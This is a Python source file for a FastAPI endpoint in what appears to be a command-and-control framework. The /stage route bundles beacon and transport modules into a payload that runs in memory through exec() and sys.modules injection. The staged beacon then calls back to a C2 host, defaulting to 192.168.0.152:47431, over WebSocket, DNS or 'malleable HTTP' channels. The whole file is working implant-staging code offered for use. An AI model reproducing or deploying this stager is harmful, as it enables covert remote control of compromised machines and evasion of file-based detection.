"""
© AngelaMos | 2026
ops/staging.py
"""

import logging
from pathlib import Path
from fastapi import APIRouter, HTTPException, Response, Request

logger = logging.getLogger(__name__)

staging_router = APIRouter()

@staging_router.get("/stage")
async def get_stage_payload(request: Request) -> Response:
    """
    Read transport.py and beacon.py and wrap them so the transport and app modules
    are natively registered in sys.modules during in-memory execution.
    """
    transport_type = request.query_params.get("transport", "websocket")
    target = request.query_params.get("target", "192.168.0.152:47431")

    base_dir = Path(__file__).resolve().parent.parent
    transport_path = base_dir / "transport.py"
    beacon_path = base_dir / "beacon.py"

    if not transport_path.exists() or not beacon_path.exists():
        logger.warning("Required payload components not found at %s or %s", transport_path, beacon_path)
        raise HTTPException(status_code=404, detail="Beacon payload components not found")

    try:
        transport_code = transport_path.read_text(encoding="utf-8")
        beacon_code = beacon_path.read_text(encoding="utf-8")

        # Wrap transport and app packages into sys.modules so imports resolve seamlessly in-memory
        bundled_payload = f"""
import sys
import types
import asyncio
import uuid

# --- IN-MEMORY MODULE REGISTRATION ---
transport_module = types.ModuleType('transport')
exec('''{transport_code}''', transport_module.__dict__)
sys.modules['transport'] = transport_module

# Mock app module structures to satisfy absolute imports
app_module = types.ModuleType('app')
app_beacon = types.ModuleType('app.beacon')
app_beacon.transport = transport_module
sys.modules['app'] = app_module
sys.modules['app.beacon'] = app_beacon
sys.modules['app.beacon.transport'] = transport_module

# --- BEACON SCRIPT EXECUTION ---
{beacon_code}

# --- DYNAMIC ENTRYPOINT INITIALIZATION ---
if __name__ == "__main__":
    from transport import WebSocketTransport, DNSTransport, MalleableHTTPTransport
    from beacon import Beacon

    async def _run_staged_beacon():
        session_id = str(uuid.uuid4())
        t_type = "{transport_type}"
        tgt = "{target}"

        if t_type == "websocket":
            transport = WebSocketTransport(f"ws://{{tgt}}/ws/beacon", session_id)
        elif t_type == "dns":
            transport = DNSTransport("c2.localhost", session_id, dns_server_ip="192.168.0.152", dns_server_port=53)
        else:
            transport = MalleableHTTPTransport(f"http://{{tgt}}", session_id)

        beacon = Beacon(session_id=session_id, transport=transport)
        await beacon.start()

    try:
        asyncio.run(_run_staged_beacon())
    except KeyboardInterrupt:
        pass
"""
        return Response(content=bundled_payload, media_type="text/plain")
    except Exception as e:
        logger.error("Failed to read beacon payload components: %s", e)
        raise HTTPException(status_code=500, detail="Internal server error")